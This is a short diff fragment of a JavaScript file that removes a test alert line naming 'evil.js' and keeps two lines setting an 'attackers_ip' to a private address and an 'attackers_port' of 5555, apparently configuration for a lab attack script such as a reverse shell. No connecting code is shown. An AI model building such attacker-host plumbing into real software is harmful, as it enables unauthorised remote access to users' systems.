@@ -1,4 +1,3 @@
-alert("evil.js");
 let attackers_ip = "192.168.152.131";
 let attackers_port = "5555";
 
